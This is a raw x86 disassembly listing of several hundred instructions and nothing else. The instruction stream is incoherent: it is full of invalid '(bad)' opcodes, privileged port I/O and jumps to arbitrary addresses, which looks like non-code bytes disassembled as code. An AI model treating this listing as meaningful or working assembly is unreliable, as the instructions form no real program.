  410a83:	or     ebp,DWORD PTR [eax+edi*4-0x75]
  410a87:	repnz mov esp,0x4eb4b340
  410a8d:	cmp    BYTE PTR [ebx+0x74e3d6cb],cl
  410a93:	ret    0xcfae
  410a96:	out    0xd3,eax
  410a98:	mov    eax,0x63a6eaa5
  410a9d:	repz push ss
  410a9f:	loop   0x410a3e
  410aa1:	out    0x53,al
  410aa3:	shr    BYTE PTR [ebp+esi*2+0x17],cl
  410aa7:	xchg   BYTE PTR [bx-0x4d],dl
  410aab:	enter  0x6d33,0x14
  410aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ab0:	pushf  
  410ab1:	les    ecx,FWORD PTR [ebx]
  410ab3:	and    ebp,DWORD PTR [ebp-0x1f]
  410ab6:	(bad)  
  410ab7:	lods   eax,DWORD PTR ds:[esi]
  410ab8:	xor    BYTE PTR [edx-0x2a],bh
  410abb:	pop    esp
  410abc:	ins    BYTE PTR es:[edi],dx
  410abd:	rcl    DWORD PTR [edx],cl
  410abf:	dec    eax
  410ac0:	push   ebx
  410ac1:	mov    ds:0x52cf4e99,eax
  410ac6:	popf   
  410ac7:	jb     0x410ae0
  410ac9:	sub    DWORD PTR [ebp-0x433e5e4a],esi
  410acf:	mov    ecx,0x2a48d6f7
  410ad4:	lds    ebp,FWORD PTR [edi+0x41]
  410ad7:	sub    bh,al
  410ad9:	clc    
  410ada:	imul   ebp,eax,0xfd129c7c
  410ae0:	int3   
  410ae1:	mov    DWORD PTR [esi+0x3d77a6a7],esi
  410ae7:	rcr    edi,1
  410ae9:	dec    edx
  410aea:	add    ebx,0x164b4f53
  410af0:	lahf   
  410af1:	popf   
  410af2:	mov    ds:0xf8a79a3e,eax
  410af7:	call   0xea61:0xae507f37
  410afe:	js     0x410b3d
  410b00:	in     eax,dx
  410b01:	sub    BYTE PTR [ebx],bh
  410b03:	push   ds
  410b04:	fidivr WORD PTR [edi]
  410b06:	ror    BYTE PTR [esp+edi*8-0x5e],1
  410b0a:	mov    eax,0x72a03678
  410b0f:	adc    DWORD PTR [ebx-0x9f560ce],ecx
  410b15:	addr16 leave 
  410b17:	repnz (bad) 
  410b19:	pop    edx
  410b1a:	add    eax,0x182f0bfd
  410b1f:	mov    ds:0x2b5e959b,al
  410b24:	frstor [esi-0x1a03f41f]
  410b2a:	loopne 0x410b22
  410b2c:	cmp    DWORD PTR [ebp+0x53],0x384595b8
  410b33:	nop
  410b34:	popa   
  410b35:	daa    
  410b36:	jmp    0xfa2dc583
  410b3b:	ret    
  410b3c:	arpl   di,bx
  410b3e:	and    BYTE PTR [esi-0x1854f54a],bh
  410b44:	jp     0x410bb0
  410b46:	call   0x29b720b9
  410b4b:	sbb    bl,ah
  410b4d:	ja     0x410b79
  410b4f:	sub    DWORD PTR [edx-0x80],eax
  410b52:	jne    0x410b16
  410b54:	inc    eax
  410b55:	sub    DWORD PTR [edx+0x48],ecx
  410b58:	pop    edi
  410b59:	dec    edi
  410b5a:	adc    ch,BYTE PTR [edx*4+0x2c9178b3]
  410b61:	add    al,0x3f
  410b63:	and    esi,DWORD PTR [eax+0x39]
  410b66:	pop    ecx
  410b67:	cs xor eax,0x31457bb0
  410b6d:	or     al,0x8c
  410b6f:	mov    al,0xff
  410b71:	mov    ds:0x34a27d8,al
  410b76:	(bad)  
  410b77:	jmp    DWORD PTR [ecx-0x331ad8c8]
  410b7d:	jg     0x410ba4
  410b7f:	test   BYTE PTR [edx-0x6],al
  410b82:	popa   
  410b83:	hlt    
  410b84:	xchg   ebx,eax
  410b85:	rol    BYTE PTR [ebx+0x4e],0x83
  410b89:	mov    ds:0xa861351d,eax
  410b8e:	push   es
  410b8f:	jb     0x410b68
  410b91:	ror    ecx,0x10
  410b94:	mov    bh,0x17
  410b96:	xchg   ebp,eax
  410b97:	inc    edi
  410b98:	add    al,0x0
  410b9a:	(bad)  
  410b9b:	sub    ch,BYTE PTR [edi]
  410b9d:	cmp    edx,DWORD PTR [esi-0x20]
  410ba0:	repnz mov WORD PTR [esi-0x12],fs
  410ba4:	pop    ebx
  410ba5:	jns    0x410beb
  410ba7:	pop    ebp
  410ba8:	add    eax,0xe43b909b
  410bad:	xchg   ecx,eax
  410bae:	pop    ebx
  410baf:	or     eax,0x61dcd859
  410bb4:	cld    
  410bb5:	dec    esi
  410bb6:	xor    ebx,ebx
  410bb8:	jne    0x410b86
  410bba:	mov    bl,0x53
  410bbc:	cmp    ch,BYTE PTR [ebp+ebx*2+0x53]
  410bc0:	and    ch,BYTE PTR [edx+eax*2]
  410bc3:	xchg   ebx,eax
  410bc4:	cdq    
  410bc5:	lock mul BYTE PTR [ebx-0x563845ab]
  410bcc:	aad    0xbd
  410bce:	xor    eax,0x1538dc12
  410bd3:	pop    ss
  410bd4:	adc    ecx,DWORD PTR [edx+ecx*2-0x3882aa20]
  410bdb:	and    BYTE PTR [edx+0x37],al
  410bde:	sub    bh,BYTE PTR ds:0x37299b83
  410be4:	fld    TBYTE PTR [esp+edi*4-0x6c]
  410be8:	adc    dl,BYTE PTR [edi+0x60f746fc]
  410bee:	sbb    al,0x20
  410bf0:	dec    esi
  410bf1:	adc    al,0xb
  410bf3:	or     BYTE PTR [edx-0x1f4f7362],dl
  410bf9:	out    dx,eax
  410bfa:	not    DWORD PTR [edx]
  410bfc:	imul   ebp,DWORD PTR [ebp+eax*8+0x43],0x86e91239
  410c04:	push   eax
  410c05:	or     esi,DWORD PTR ss:[edx+0x24f49982]
  410c0c:	cmp    BYTE PTR [ebx+0x233334eb],cl
  410c12:	loop   0x410c63
  410c14:	je     0x410ba0
  410c16:	pop    ss
  410c17:	je     0x410bfd
  410c19:	fcomp  DWORD PTR [ecx+0x3ad11551]
  410c1f:	call   0x1787:0x457e9f
  410c26:	inc    esi
  410c27:	stos   DWORD PTR es:[edi],eax
  410c28:	mov    edx,0xa29e10f7
  410c2d:	inc    eax
  410c2e:	ffreep st(5)
  410c30:	rcl    DWORD PTR [ebp-0x26],0x87
  410c34:	sub    ecx,DWORD PTR [ebx-0x78]
  410c37:	push   dx
  410c39:	sbb    eax,0x90e1b626
  410c3e:	and    al,0x3d
  410c40:	sub    ebx,ebx
  410c42:	mov    dh,0x93
  410c44:	loop   0x410bdc
  410c46:	stos   BYTE PTR es:[edi],al
  410c47:	inc    ecx
  410c48:	clc    
  410c49:	pop    eax
  410c4a:	adc    al,cl
  410c4c:	and    bl,bh
  410c4e:	mul    BYTE PTR ds:0x85d9a6f8
  410c54:	sbb    bh,BYTE PTR [ecx+ecx*1+0x25027087]
  410c5b:	adc    al,0x5f
  410c5d:	stos   DWORD PTR es:[edi],eax
  410c5e:	or     esp,DWORD PTR [edx]
  410c60:	int3   
  410c61:	cld    
  410c62:	or     DWORD PTR [esi-0x380c3785],edi
  410c68:	jb     0x410cd1
  410c6a:	cmp    edi,DWORD PTR [ecx+0x34f11844]
  410c70:	scas   al,BYTE PTR es:[edi]
  410c71:	pop    ebp
  410c72:	in     eax,dx
  410c73:	xchg   bl,dl
  410c75:	cmp    al,0x8d
  410c77:	jno    0x410c8c
  410c79:	in     eax,dx
  410c7a:	sbb    DWORD PTR [esi+esi*4+0x6ec5932c],esp
  410c81:	hlt    
  410c82:	mov    ch,0xdc
  410c84:	push   ss
  410c85:	lods   al,BYTE PTR ds:[esi]
  410c86:	jmp    0x410c1a
  410c88:	mov    ah,0x2
  410c8a:	xchg   BYTE PTR [ebx+edx*2+0x9968259],bl
  410c91:	push   edx
  410c92:	inc    ecx
  410c93:	mov    dl,0xf4
  410c95:	mov    ds:0x61daebd9,al
  410c9a:	inc    ch
  410c9c:	dec    edx
  410c9d:	fldcw  WORD PTR [ebx]
  410c9f:	push   ebp
  410ca0:	jb     0x410c2e
  410ca2:	dec    eax
  410ca3:	mov    ds:0x51d5482a,eax
  410ca8:	jg     0x410c7e
  410caa:	push   0x2bce1d72
  410caf:	or     al,BYTE PTR [esi+ecx*4]
  410cb2:	jmp    DWORD PTR [edx]
  410cb4:	fbstp  TBYTE PTR [esi-0x53678fde]
  410cba:	push   edx
  410cbb:	xchg   esp,eax
  410cbc:	push   ebx
  410cbd:	add    eax,0x60760bcb
  410cc2:	(bad)  
  410cc3:	test   al,0x9b
  410cc5:	arpl   WORD PTR [eax-0x39c37e9d],ax
  410ccb:	dec    edx
  410ccc:	stc    
  410ccd:	push   esp
  410cce:	jg     0x410c76
  410cd0:	retf   0xaad5
  410cd3:	pop    esi
  410cd4:	mov    edi,0x8e3b5e6
  410cd9:	mov    DWORD PTR [edi],esp
  410cdb:	fimul  DWORD PTR [esi+edi*1-0x42]
  410cdf:	rol    DWORD PTR [esi],1
  410ce1:	sbb    BYTE PTR ds:0x6b5f436b,dl
  410ce7:	cwde   
  410ce8:	das    
  410ce9:	dec    BYTE PTR [edx]
  410ceb:	stc    
  410cec:	test   al,0xe9
  410cee:	loopne 0x410d08
  410cf0:	mov    edi,0x108104eb
  410cf5:	mov    bh,0x4b
  410cf7:	xchg   esp,eax
  410cf8:	sub    edi,DWORD PTR [esi+0x34]
  410cfb:	or     al,0x8
  410cfd:	fild   QWORD PTR [eax]
  410cff:	test   dl,0xff
  410d02:	adc    DWORD PTR [ebx+0x781cad],0x2d
  410d09:	inc    DWORD PTR [ebp-0x224f1aed]
  410d0f:	or     DWORD PTR [esi-0xe],esp
  410d12:	sbb    al,0xb5
  410d14:	xor    ah,BYTE PTR [ecx-0x27]
  410d17:	sub    eax,0xd29fb143
  410d1c:	mov    cl,0x86
  410d1e:	aas    
  410d1f:	sub    ch,BYTE PTR [ebp+edi*2+0x4c15db76]
  410d26:	jno    0x410d89
  410d28:	je     0x410d2e
  410d2a:	pop    es
  410d2b:	pop    esi
  410d2c:	push   ss
  410d2d:	mov    DWORD PTR [eax-0x2d],0xa1e7a0ef
  410d34:	out    dx,al
  410d35:	in     al,0x97
  410d37:	mov    ds:0xe468b936,al
  410d3c:	test   BYTE PTR [edx-0x4],0xe1
  410d40:	adc    eax,ecx
  410d42:	(bad)  
  410d43:	addr16 (bad) 
  410d45:	sub    edx,esp
  410d47:	push   ds
  410d48:	not    BYTE PTR [ebx-0x6eeb9a62]
  410d4e:	rol    DWORD PTR [ebp-0x6ad1c4b0],1
  410d54:	les    esi,FWORD PTR [edi+0xeff5b9d]
  410d5a:	cmp    eax,0x90785429
  410d5f:	out    dx,eax
  410d60:	int    0xb1
  410d62:	arpl   WORD PTR [eax+eiz*4+0x62a9f068],cx
  410d69:	mov    esp,0x8c231cac
  410d6e:	fmul   st,st(3)
  410d70:	pop    esi
  410d71:	shufps xmm0,xmm1,0x53
  410d75:	test   eax,0x717e23dc
  410d7a:	rcl    DWORD PTR [eax-0x3aaf0acc],0x25
  410d81:	mov    dh,0x5b
  410d83:	mov    ebp,0x407b0d95
  410d88:	pop    esi
  410d89:	inc    ebp
  410d8a:	mov    edi,DWORD PTR [eax+0x5b]
  410d8d:	call   0xfbcd:0x87492106
  410d94:	pop    edx
  410d95:	add    al,0x7e
  410d97:	cs clc 
  410d99:	mov    edi,0x7eeea31d
  410d9e:	and    al,0xa
  410da0:	inc    ebp
  410da1:	dec    edi
  410da2:	in     al,dx
  410da3:	pop    ebp
  410da4:	es mov dl,0x79
  410da7:	imul   ebp,DWORD PTR [edi],0xfabe9bb3
  410dad:	sbb    bl,BYTE PTR [ecx+0x4d]
  410db0:	lahf   
  410db1:	fidiv  DWORD PTR [ecx+0x3c1c911e]
  410db7:	stc    
  410db8:	pop    edx
  410db9:	and    BYTE PTR [edi+0x4fc4fed5],dl
  410dbf:	in     eax,dx
  410dc0:	clc    
  410dc1:	mov    eax,0x411b6537
  410dc6:	cmp    ecx,0xffffff8b
  410dc9:	mov    esi,0xf878c2de
  410dce:	pusha  
  410dcf:	cmp    eax,0x24fe74d4
  410dd4:	add    al,0xb9
  410dd6:	and    DWORD PTR [edx+0x2d],0xffffffce
  410dda:	mov    edi,ecx
  410ddc:	jp     0x410e1f
  410dde:	call   0x3cb91742
  410de3:	pop    ds
  410de4:	ret    0x565c
  410de7:	jb     0x410d6f
  410de9:	push   esi
  410dea:	mov    ebx,0xf84f832c
  410def:	and    DWORD PTR [edi],esi
  410df1:	into   
  410df2:	hlt    
  410df3:	inc    edi
  410df4:	div    ebp
  410df6:	mov    esi,0xa5e42aad
  410dfb:	rol    BYTE PTR [eax],0xde
  410dfe:	lahf   
  410dff:	jns    0x410d94
  410e01:	pop    edi
  410e02:	daa    
  410e03:	sub    edx,esi
  410e05:	push   edi
  410e06:	sub    bh,BYTE PTR [edx-0x461c70ff]
  410e0c:	gs and al,bh
  410e0f:	(bad)  
  410e10:	fucomi st,st(1)
  410e12:	sahf   
  410e13:	cmp    BYTE PTR [eax+0x3cfa9219],0x41
  410e1a:	dec    esi
  410e1b:	outs   dx,BYTE PTR ds:[esi]
  410e1c:	daa    
  410e1d:	pop    ss
  410e1e:	xchg   ebx,eax
  410e1f:	nop
  410e20:	or     eax,0x5de6dbfd
  410e25:	lods   al,BYTE PTR ds:[esi]
  410e26:	in     eax,0xce
  410e28:	inc    edi
  410e29:	and    dl,BYTE PTR [ebx-0x65]
  410e2c:	cmp    eax,0xecb76680
  410e31:	cmp    DWORD PTR [ebx+ebp*1-0x547a1e79],ebp
  410e38:	adc    ebx,DWORD PTR [esi]
  410e3a:	fwait
  410e3b:	pop    esp
  410e3c:	xor    BYTE PTR [ebp+0x0],bl
  410e3f:	fs push 0x99cdd2d8
  410e45:	push   ds
  410e46:	cmp    al,BYTE PTR [edx+ebp*2-0x34d0044b]
  410e4d:	mov    ds:0x1d2fdbee,al
  410e52:	pop    edi
  410e53:	jle    0x410e91
  410e55:	dec    edx
  410e56:	inc    ebp
  410e57:	ins    BYTE PTR es:[edi],dx
  410e58:	sar    dh,1
  410e5a:	aam    0x68
  410e5c:	lock add eax,0x375816c2
  410e62:	icebp  
  410e63:	inc    esi
  410e64:	(bad)  
  410e65:	out    dx,eax
  410e66:	pop    ebp
  410e67:	ds aas 
  410e69:	stc    
  410e6a:	or     al,0x62
  410e6c:	popa   
  410e6d:	inc    ebx
  410e6e:	dec    edx
  410e6f:	or     DWORD PTR [ebp+0x70],ebp
  410e72:	adc    dh,BYTE PTR [edi-0x19]
  410e75:	and    bl,ch
  410e77:	xchg   edx,eax
  410e78:	inc    esi
  410e79:	into   
  410e7a:	mov    ds:0x334938e7,eax
  410e7f:	cs scas al,BYTE PTR es:[edi]
  410e81:	or     ecx,edi
  410e83:	in     eax,0x4d
  410e85:	pop    esi
  410e86:	test   DWORD PTR ds:0xf937d247,0x1211dd78
  410e90:	sub    BYTE PTR [ebx*1-0x9484044],bh
  410e97:	mov    es,WORD PTR [eax+0x6]
  410e9a:	imul   ebx,DWORD PTR [eax+0x73],0x81d90cea
  410ea1:	xor    BYTE PTR [edi+ebp*2-0x14e78acf],al
  410ea8:	xor    eax,0xdb5c4af8
  410ead:	inc    ebx
  410eae:	into   
  410eaf:	inc    edx
  410eb0:	xchg   BYTE PTR [edx-0x7f],al
  410eb3:	cmp    al,0xec
  410eb5:	ja     0x410e56
  410eb7:	and    ebp,DWORD PTR [ecx]
  410eb9:	mov    esp,0xcca6446
  410ebe:	mov    bl,0xb0
  410ec0:	mov    ecx,0x43eee5ce
  410ec5:	jge    0x410eb5
  410ec7:	pop    es
  410ec8:	lahf   
  410ec9:	shl    bl,1
  410ecb:	jg     0x410ed5
  410ecd:	dec    esi
  410ece:	adc    eax,DWORD PTR [eax+0x20]
  410ed1:	fsub   DWORD PTR [ebp+0x535ae277]
  410ed7:	gs loopne 0x410ed7
  410eda:	dec    edi
  410edb:	mov    eax,ds:0x32d0426b
  410ee0:	push   ss
  410ee1:	push   es
  410ee2:	into   
  410ee3:	cmp    esp,esi
  410ee5:	inc    ebp
  410ee6:	outs   dx,BYTE PTR ds:[esi]
  410ee7:	pop    esp
  410ee8:	stc    
  410ee9:	mov    al,ds:0x3766250e
  410eee:	sub    eax,0xab2986e
  410ef3:	jne    0x410eb1
  410ef5:	cmp    BYTE PTR [eax+edi*1-0xf],bl
  410ef9:	pushf  
  410efa:	jbe    0x410f04
  410efc:	out    0x72,eax
  410efe:	cld    
  410eff:	mov    al,ds:0x900f2331
  410f04:	ja     0x410e97
  410f06:	xchg   esi,eax
  410f07:	push   es
  410f08:	sbb    al,0x13
  410f0a:	sahf   
  410f0b:	xchg   ebx,eax
  410f0c:	aaa    
  410f0d:	push   ss
  410f0e:	and    BYTE PTR [esi],al
  410f10:	dec    esi
  410f11:	mov    ebx,0x5cdde83
  410f16:	data16 sbb cl,BYTE PTR [ebx-0x3d7368c]
  410f1d:	lods   al,BYTE PTR ds:[esi]
  410f1e:	ds xchg ebp,eax
  410f20:	aad    0xa3
  410f22:	xchg   edi,eax
  410f23:	out    0x57,al
  410f25:	fiadd  WORD PTR [eax+0x63b5495]
  410f2b:	dec    eax
  410f2c:	mov    bh,0x68
  410f2e:	add    dl,ch
  410f30:	sbb    edi,DWORD PTR ds:[eax+0x5faf1ba]
  410f37:	ror    BYTE PTR [edx+0x6cce39e7],1
  410f3d:	fst    DWORD PTR [ebp+0x31d10033]
  410f43:	and    esi,DWORD PTR [ebp-0xa01f2b1]
  410f49:	push   eax
  410f4a:	std    
  410f4b:	fxam   
  410f4d:	jge    0x410f61
  410f4f:	sbb    ch,BYTE PTR [ebp+0x45]
  410f52:	dec    edx
  410f53:	mov    bh,0xc7
  410f55:	dec    esi
  410f56:	lds    esp,FWORD PTR [bx+di+0x3b]
  410f5a:	data16 sub BYTE PTR [edx+0x5f],ch
  410f5e:	stos   DWORD PTR es:[edi],eax
  410f5f:	inc    edx
  410f60:	hlt    
  410f61:	bound  esp,QWORD PTR [eax+0x3ab59745]
  410f67:	adc    al,0x5e
  410f69:	jmp    0x410f19
  410f6b:	mov    al,0xa6
  410f6d:	call   0xda97:0x6be663b5
  410f74:	cmp    al,0xda
  410f76:	arpl   WORD PTR [esp+eax*8-0x42acb64d],dx
  410f7d:	aaa    
  410f7e:	das    
  410f7f:	jae    0x410f56
  410f81:	fwait
  410f82:	or     ah,bh
  410f84:	out    0x59,al
  410f86:	add    dl,BYTE PTR [esi+ebp*4]
  410f89:	cwde   
  410f8a:	ins    DWORD PTR es:[edi],dx
  410f8b:	imul   eax,DWORD PTR ds:0x9b398c03,0x35
  410f92:	mov    esp,0xf28a392a
  410f97:	mov    edi,0x8461942e
  410f9c:	mov    edi,DWORD PTR [edi-0x3a]
  410f9f:	or     dl,al
  410fa1:	push   0x39
  410fa3:	xor    ebp,edi
  410fa5:	pusha  
  410fa6:	push   es
  410fa7:	fcmovb st,st(3)
  410fa9:	push   esi
  410faa:	dec    edi
  410fab:	mov    edx,0x4c5f73b3
  410fb0:	call   0x5389f360
  410fb5:	(bad)  
  410fb6:	aam    0x57
  410fb8:	or     eax,0xc4a950b5
  410fbd:	mov    esp,edi
  410fbf:	adc    BYTE PTR [ebp-0x3ff85176],dh
  410fc5:	push   ss
  410fc6:	aad    0x76
  410fc8:	mov    bh,BYTE PTR [edi-0x5f]
  410fcb:	add    al,0xdd
  410fcd:	sbb    al,0x74
  410fcf:	sub    al,0x17
  410fd1:	sub    eax,0x806b251d
  410fd6:	sbb    DWORD PTR [edx],ebp
  410fd8:	rcl    DWORD PTR [esi-0x2484350d],1
  410fde:	out    dx,al
  410fdf:	adc    esp,DWORD PTR [eax+0x77]
  410fe2:	fild   DWORD PTR [edi+0x5d3a452]
  410fe8:	lods   al,BYTE PTR ds:[esi]
  410fe9:	push   ss
  410fea:	xchg   edi,eax
  410feb:	out    dx,eax
  410fec:	cli    
  410fed:	retf   
  410fee:	cmp    eax,0x3f7a671b
  410ff3:	mov    esp,0xf6e5374d
  410ff8:	and    BYTE PTR [ebx],dl
  410ffa:	adc    eax,0xe74220a6
  410fff:	mov    eax,0x2df319d4
  411004:	rcr    BYTE PTR [esp+edi*1],cl
  411007:	loope  0x410fe5
  411009:	js     0x410fe1
  41100b:	jge    0x41103f
  41100d:	push   ss
  41100e:	or     bl,BYTE PTR [ebp-0x4f]
  411011:	xor    ah,dh
  411013:	cmp    esi,edx
  411015:	out    dx,al
  411016:	sbb    al,0x27
  411018:	mov    eax,0xd629a84b
  41101d:	repz push ss
  41101f:	push   es
  411020:	sbb    BYTE PTR [esi+0x6809fb2c],0xf3
  411027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411029:	or     eax,esi
  41102b:	pusha  
  41102c:	popa   
  41102d:	stos   DWORD PTR es:[edi],eax
  41102e:	sbb    eax,ebp
  411030:	mov    ebx,ds
  411032:	cmc    
  411033:	lds    ecx,FWORD PTR es:[esi+0x4e9db9a6]
  41103a:	xchg   BYTE PTR ds:0x4c6e3ef6,bh
  411040:	gs sub ch,cl
  411043:	mov    esp,0xce81b894
  411048:	lock ret 
  41104a:	jbe    0x411061
  41104c:	sbb    esp,DWORD PTR [ebp+0x7105673c]
  411052:	sti    
  411053:	inc    esi
  411054:	js     0x411028
  411056:	mov    edx,0x25e0c8f
  41105b:	sbb    ebp,DWORD PTR [edi+0x79b4a168]
  411061:	stos   BYTE PTR es:[edi],al
  411062:	xchg   esp,eax
  411063:	inc    ebp
  411064:	mov    cs,WORD PTR ds:0xcb34f3cd
  41106a:	jns    0x411005
  41106c:	pop    ss
  41106d:	enter  0x1e31,0xa7
  411071:	scas   eax,DWORD PTR es:[edi]
  411072:	cli    
  411073:	and    dl,BYTE PTR ds:0xb78d44c2
  411079:	mov    ss,WORD PTR [ebp-0x4dcf958c]
  41107f:	jl     0x41106c
  411081:	jge    0x41100f
  411083:	push   esi
  411084:	enter  0x78c9,0x7e
  411088:	(bad)  
  411089:	fcom   QWORD PTR [ebx-0x415ebaf1]
  41108f:	mov    ch,0xfd
  411091:	mov    esp,0x17d1a92
  411096:	out    0xdf,al
  411098:	pop    ds
  411099:	jbe    0x4110c3
  41109b:	xchg   BYTE PTR [eax+0x63],dh
  41109e:	cmp    al,0x77
  4110a0:	cdq    
  4110a1:	not    DWORD PTR [esi]
  4110a3:	jb     0x4110b4
  4110a5:	mov    ebp,0xb6bdbe09
  4110aa:	and    BYTE PTR [ebp+0x53],dl
  4110ad:	sbb    ebp,DWORD PTR [edx-0x491b33ec]
  4110b3:	xchg   BYTE PTR [eax],bh
  4110b5:	test   BYTE PTR [ebx],cl
  4110b7:	stc    
  4110b8:	not    DWORD PTR [ecx+0x5ae162dc]
  4110be:	pop    esi
  4110bf:	sti    
  4110c0:	mov    esi,0xdfad5e08
  4110c5:	(bad)  
  4110c6:	retf   0xb79
  4110c9:	adc    DWORD PTR gs:[edi-0x153c3622],edi
  4110d0:	xchg   BYTE PTR [edi+0x3db33641],bl
  4110d6:	xchg   ebp,eax
  4110d7:	inc    edi
  4110d8:	lods   eax,DWORD PTR ds:[esi]
  4110d9:	rol    BYTE PTR [esi+ecx*8+0x17],1
  4110dd:	cli    
  4110de:	bound  edx,QWORD PTR [eax-0x43967442]
  4110e4:	in     al,0xfd
  4110e6:	jns    0x41106f
  4110e8:	xchg   DWORD PTR [ebp-0x741f2ad7],esp
  4110ee:	push   edi
  4110ef:	jbe    0x411116
  4110f1:	xchg   esp,eax
  4110f2:	cli    
  4110f3:	inc    eax
  4110f4:	jle    0x411076
  4110f6:	enter  0xaf55,0x2
  4110fa:	mov    al,BYTE PTR [ebp+0xc]
  4110fd:	stc    
  4110fe:	xor    bl,bl
  411100:	mov    WORD PTR [edx-0x2a0465f2],es
  411106:	aad    0xa5
  411108:	retf   0xa1ed
  41110b:	jbe    0x411183
  41110d:	lods   al,BYTE PTR ds:[esi]
  41110e:	push   ebx
  41110f:	mov    ecx,0x8327d33c
  411114:	cmp    dl,BYTE PTR [esi+0x7349e924]
  41111a:	xor    DWORD PTR [edi+0x1e709945],0x67
  411121:	into   
  411122:	pop    es
  411123:	adc    BYTE PTR [eax-0x2a2f7108],bh
  411129:	iret   
  41112a:	jg     0x4111a7
  41112c:	inc    esi
  41112d:	xor    DWORD PTR [ebp-0x723f03f7],eax
  411133:	xor    bl,bh
  411135:	dec    esi
  411136:	test   BYTE PTR [esi+0x18],al
  411139:	outs   dx,DWORD PTR ds:[esi]
  41113a:	push   eax
  41113b:	xchg   ebx,eax
  41113c:	add    BYTE PTR [edi+0x26c7bb24],al
  411142:	ret    0x8a4d
  411145:	lahf   
  411146:	jno    0x411155
  411148:	or     al,0xed
  41114a:	js     0x4111c6
  41114c:	ret    
  41114d:	add    al,0x7b
  41114f:	ds out dx,al
  411151:	and    DWORD PTR [ecx-0xa0d83c1],esi
  411157:	mov    eax,ds:0x6ede478b
  41115c:	jnp    0x411162
  41115e:	lahf   
  41115f:	jnp    0x411153
  411161:	es xor al,ah
  411164:	frstor [esi+ebx*1+0x5f3c79f0]
  41116b:	mov    dl,0x25
  41116d:	mov    BYTE PTR [ebx-0x1d],cl
  411170:	dec    esp
  411171:	(bad)  
  411173:	test   eax,0xae10b22f
  411178:	dec    ecx
  411179:	push   eax
  41117a:	repz xchg ecx,eax
  41117c:	and    ch,al
  41117e:	cmc    
  41117f:	xor    DWORD PTR [ecx+esi*8],0x1944eae6
  411186:	jmp    0x637:0xdd889a4c
  41118d:	scas   eax,DWORD PTR es:[edi]
  41118e:	or     al,0xb4
  411190:	cmp    ebp,edi
  411192:	mov    ebp,0x358e4c27
  411197:	add    BYTE PTR [edx-0x3a],bl
  41119a:	jne    0x411216
  41119c:	mov    eax,ds:0x27bc7375
  4111a1:	push   ecx
  4111a2:	xor    DWORD PTR [eax-0x48],0x34
  4111a6:	inc    ebx
  4111a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a8:	scas   al,BYTE PTR es:[edi]
  4111a9:	pop    esp
  4111aa:	mov    esi,0x34241d85
  4111af:	into   
  4111b0:	xor    al,0xd5
  4111b2:	adc    BYTE PTR [edi],dl
  4111b4:	es xchg esp,eax
  4111b6:	cmp    ah,al
  4111b8:	and    eax,0xb4c7191c
  4111bd:	arpl   WORD PTR [ebx+0xa],dx
  4111c0:	push   cs
  4111c1:	mov    ebx,0x657ebf05
  4111c6:	test   eax,0x3b659c30
  4111cb:	dec    ecx
  4111cc:	xchg   BYTE PTR ds:0x7c57f177,al
  4111d2:	ds ss jmp ecx
  4111d6:	lods   al,BYTE PTR ds:[esi]
  4111d7:	in     eax,0x7d
  4111d9:	loope  0x411199
  4111db:	jecxz  0x4111c4
  4111dd:	inc    ecx
  4111de:	lods   eax,DWORD PTR ds:[esi]
  4111df:	fst    QWORD PTR [edi+0x57]
  4111e2:	test   eax,0xf05a405f
  4111e7:	cmp    BYTE PTR [ebx],bh
  4111e9:	aad    0x47
  4111eb:	xor    ah,BYTE PTR [eax]
  4111ed:	xor    BYTE PTR [edi+0x7d12973f],bl
  4111f3:	popa   
  4111f4:	sbb    dl,BYTE PTR [ebp-0x5e45daf3]
  4111fa:	outs   dx,BYTE PTR ds:[esi]
  4111fb:	push   esi
  4111fc:	xlat   BYTE PTR ds:[ebx]
  4111fd:	rcl    BYTE PTR ds:0xc5115a71,cl
  411203:	add    al,0xee
  411205:	std    
  411206:	nop
  411207:	es stos BYTE PTR es:[edi],al
  411209:	dec    ebp
  41120a:	or     al,0x3
  41120c:	mov    ebx,0x41410f25
  411211:	es test esi,0x96b34ebe
  411218:	add    bh,BYTE PTR [edi-0x2b]
  41121b:	mov    BYTE PTR [edx],bh
  41121d:	adc    al,0x3b
  41121f:	scas   al,BYTE PTR es:[edi]
  411220:	bound  ecx,QWORD PTR [edx]
  411222:	push   DWORD PTR [ebp+0x18]
  411225:	add    BYTE PTR [edx],ah
  411227:	mov    ds:0x32055ea7,al
  41122c:	sbb    BYTE PTR [ebx-0x4df44ba8],cl
  411232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411233:	scas   eax,DWORD PTR es:[edi]
  411234:	ins    BYTE PTR es:[edi],dx
  411235:	pop    ebp
  411236:	icebp  
  411237:	sbb    eax,0x4c560c85
  41123c:	into   
  41123d:	and    bl,BYTE PTR [eax+0x75]
  411240:	imul   edx,DWORD PTR [ecx+eax*2],0x59278cd5
  411247:	imul   edx,DWORD PTR [esi-0x498aedca],0x3b
  41124e:	jmp    0x4111e8
  411250:	scas   al,BYTE PTR es:[edi]
  411251:	xlat   BYTE PTR ds:[ebx]
  411252:	in     eax,0x2d
  411254:	ficom  WORD PTR [edi]
  411256:	cli    
  411257:	outs   dx,BYTE PTR ds:[esi]
  411258:	(bad)  
  411259:	data16 cmp al,0x78
  41125c:	aam    0xfd
  41125e:	dec    esp
  41125f:	xchg   cl,bh
  411261:	jge    0x411276
  411263:	lahf   
  411264:	and    al,0x32
  411266:	out    dx,al
  411267:	imul   ebx,edx,0x41
  41126a:	inc    eax
  41126b:	xchg   ecx,eax
  41126c:	and    BYTE PTR [ebx+ecx*1-0x6d02dadb],al
  411273:	xor    BYTE PTR [esi-0xe433247],bh
  411279:	and    edx,DWORD PTR [edx+eax*1]
  41127c:	xchg   edi,eax
  41127d:	in     al,dx
  41127e:	(bad)  
  41127f:	push   edi
  411280:	mov    eax,0x725b291d
  411285:	aaa    
  411286:	pop    ebp
  411287:	sbb    al,0xf
  411289:	mov    al,ds:0xc32c9c96
  41128e:	pop    ecx
  41128f:	push   cs
  411290:	mov    ah,0x82
  411292:	loope  0x4112da
  411294:	jmp    0x2653f9e1
  411299:	mov    esi,0xd646a172
  41129e:	shl    BYTE PTR [ecx],cl
  4112a0:	jne    0x41122a
  4112a2:	lock les ecx,FWORD PTR [edi-0xc]
  4112a6:	inc    esp
  4112a7:	add    al,0x26
  4112a9:	jnp    0x411263
  4112ab:	in     al,dx
  4112ac:	push   es
